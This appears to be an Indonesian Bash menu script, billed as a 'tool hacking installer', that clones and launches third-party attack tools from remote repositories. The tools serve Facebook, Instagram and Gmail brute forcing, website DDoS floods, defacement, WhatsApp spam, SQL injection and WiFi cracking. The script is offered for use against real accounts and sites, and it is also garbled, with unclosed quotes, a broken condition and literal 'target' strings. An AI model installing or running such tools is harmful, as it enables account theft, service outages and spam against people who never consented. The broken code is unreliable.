#!/system/xbin/bash
#Author Bahauddin
#
#
#

clear
blue='\033[34;1m'
green='\033[32;1m'  
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'                                           
yellow='\033[33;1m'
NOW=`date "+%d.%m.%Y"`
TIME=`date "+%H:%M"`

echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
echo ""
echo $white".:WELCOME TO MY TOOL HACKING BRO.............HAPPY HACKING:."
echo $purple"...........::::::::::Bahauddin Mr.B4h4'::::::::::..........."
echo $cyan".::Bermimpi lah Setinggi Langit Karena Mimpi itu Gratis:.."
echo $green"......::::::MONGGO DI Pilih Tools Yang Tersedia:::::::......"
echo $yellow
date 
echo "\033[36;1m"
echo "[+]===============================================[+]"
echo $red"|  [1] HACK FACEBOOK BRUTE FORCE               |"
echo "[+]===============================================[+]"
echo $white"|  [2] DDOS Website Dengan LITEDDOS                 |"
echo "[+]===============================================[+]"
echo $purple"|  [3] DDOS Website Dengan Torshammer               |"
echo "[+]===============================================[+]"
echo $cyan"|  [4] DDOS Website Dengan Xerxes                   |"
echo "[+]===============================================[+]"
echo $green"|  [5] DDOS Website Dengan Hammer                   |"
echo "[+]===============================================[+]"
echo $yellow"|  [6] IESDEFACE          |"
echo "[+]===============================================[+]"
echo $red"|  [7] HACK FB MBF          |"
echo "[+]===============================================[+]"
echo $white"|  [8] Install Red_Hawk                             |"
echo "[+]===============================================[+]"
echo $purple"|  [9] Instal Txtool                                |"
echo "[+]===============================================[+]"
echo $cyan"|  [10] Install Sqlmap Buat Inject Situs            |"
echo "[+]===============================================[+]"
echo $green"|  [11] SPAM WHATSAPP                        |"
echo "[+]===============================================[+]"
echo $yellow"|  [12] BREACHER                   |"
echo "[+]===============================================[+]"
echo $red"|  [13] HACK INSTAGRAM                   |"
echo "[+]===============================================[+]"
echo $white"|  [14] TOOL BAJINGANV6                            |"
echo "[+]===============================================[+]"
echo $purple"|  [15] SQLI SCAN                         |"
echo "[+]===============================================[+]"
echo $cyan"|  [16] HACK WIFI ROOT                              |"
echo "[+]===============================================[+]"
echo $green"|  [17] BRUTE FORCE GMAIL                            |"
echo "[+]===============================================[+]"
echo
echo "\033[32;1m"
read -p "╭─>[Pilih Nomer]
╰─>root@Bahauddin=•>" bro

if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Download Dulu fbbrute.py dan password.txt Di Google"
sleep 1 
echo $yellow"Taruh Di Luar Folder"
sleep 4
apt update
apt upgrade 
apt install python2
apt install python2-dev
apt install wget
pip2 install mechanize
cd/storage/emulated/0
python2 fbbrute.py
storage/emulated/0/password.txt
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing LITEDDOS..."
sleep 1
apt update
apt install git
git clone https://github.com/4L13199/LITEDDOS
mv LITEDDOS $HOME
cd $HOME/LITEDDOS
read -p "MasukanTarget:" target
python2 LITEDDOS.py target 80 100
fi

if [ $bro = 3 ] || [ $bro = 3 ]
then
clear
echo
toilet -f standard " Bahauddin" -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing Torshammer DDOS..."
sleep 1
apt update
apt install git
apt install tor
git clone https://github.com/dotfighter/torshammer.git
mv torshammer $HOME
cd $HOME/torshammer
read -p "Masukan Target:" target
python2 torshammer.py -T -t target
fi

if [ $bro = 4 ] || [ $bro = 4 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
echo $green"Installing Xerxes DDOS..."
sleep 1
apt update && apt upgrade
apt install git
apt install clang
git clone https://github.com/zanyarjamal/xerxes
mv xerxes $HOME
cd $HOME/xerxes
clang xerxes.c -o xerxes
clear
read -p "[masukanWebsiteTarget]>" target
./xerxes target 80
fi

if [ $bro = 5 ] || [ $bro = 5 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green" Installing Hammer DDOS.."
sleep 1
git clone https://github.com/cyweb/hammer
mv hammer $HOME
cd $HOME/hammer
read -p "Masukan Target:" target
python2 hammer.py -T -t target
fi

if [ $bro = 6 ] || [ $bro = 6 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing IesDeface..."
sleep 1 
apt install git
apt install bash
pip2 install bash
git clone https://github.com/ALX-04/iesDEFACE
mv iesDEFACE $HOME
cd $HOME/iesDEFACE
bash iesDeface.sh
fi


if [ $bro = 7 ] || [ $bro = 7 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing MBF..."
sleep 1
pkg install python2
pip2 install mechanize
git clone https://github.com/hnov7/mbf
mv mbf $HOME
cd $HOME/mbf
python2 mbf.py
fi

if [ $bro = 8 ] || [ $bro = 8 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing Red Hawk..."
sleep 1
apt update
apt install git
apt install php
git clone https://github.com/Tuhinshubhra/RED_HAWK
mv RED_HAWK $HOME
cd $HOME/RED_HAWK
chmod +x rhawk.php
php rhawk.php
fi

if [ $bro = 9 ] || [ $bro = 9 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing Txtool..."
sleep 1
git clone https://github.com/kuburan/txtool
mv txtool $HOME
cd $HOME/txtool
python2 install.py
python2 update.py
txtool
fi

if [ $bro = 10 ] || [ $bro = 10 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing Sqlmap..."
sleep 1
apt update
apt install git
git clone https://github.com/sqlmapproject/sqlmap
mv sqlmap $HOME
cd $HOME/sqlmap
read -p "masukan web target:" target
python2 sqlmap.py -D target
fi

if [ $bro = 11 ] || [ $bro = 11 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing Spam Wa..."
sleep 1
pkg install unzip
git clone https://github.com/Rusmana-ID/rus
mv rus $HOME
cd $HOME/rus
share spam.sh
fi

if [ $bro = 12  || [ $bro = 12 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing Breacher..."
sleep 1
pkg install python2
pkg install git
git clone https://github.com/UltimateHackers/Breacher.git
mv Breacher $HOME
cd $HOME/Breacher
python2 breacher.py
fi

if [ $bro = 13 ] || [ $bro = 13 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing Insthack Instagram..."
sleep 1 
apt update 
apt upgrade
apt install python2 
apt install git
git clone https://github.com/avramit/Instahack
mv Instahack $HOME
cd $HOME/Instahack
python2 hackinsta.py
fi

if [ $bro = 14 ] || [ $bro = 14 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing B4J1N64Nv6..."
sleep 1
git clone https://github.com/DarknessCyberTeam/BAJINGAN
mv BAJINGANv6 $HOME
cd $HOME/BAJINGANv6
sh BAJINGAN.sh
fi

if [ $bro = 15 ] || [ $bro = 15 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing SQLI SCAN..."
sleep 1
apt update && apt upgrade
apt install git
apt install curl
git clone https://github.com/thelinuxchoice/sqliscan/
mv sqliscan $HOME
cd $HOME/sqliscan
bash sqliscan.sh
fi

if [ $bro = 16 ] || [ $bro = 16 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing Wifi-Hacker..."
sleep 1
mkdir vasu
git clone https://github.com/esc0rtd3w/wifi-hacker
mv wifi-hacker $HOME
cd $HOME/wifi-hacker
./install.sh
chmod +x wifi-hacker.sh
./wifi-hacker.sh
fi

if [ $bro = 17 ] || [ $bro = 17 ]
then
clear
echo
toilet -f standard " Bahauddin " -F gay
echo
echo ""
echo -e  "#############################################################"
echo -e  "Tools    : TOOL HACKING INSTALLER         " |lolcat
echo -e  "Creted By: Baha'uddin (Mr.B4h4')  " |lolcat
echo -e  "From     : Bendokaton Tayu Pati Jateng " |lolcat
echo -e  "Contact  : 085726833815
echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
echo -e  "#############################################################"
sleep 1
echo $green"Installing Brute_force_gmail..."
sleep 1 
apt update && apt upgrade
apt install git
git clone https://github.com/JamesAndresCM/Brute_force_gmail
mv Brute_force_gmail $HOME
cd $HOME/Brute_force_gmail
ls
fi


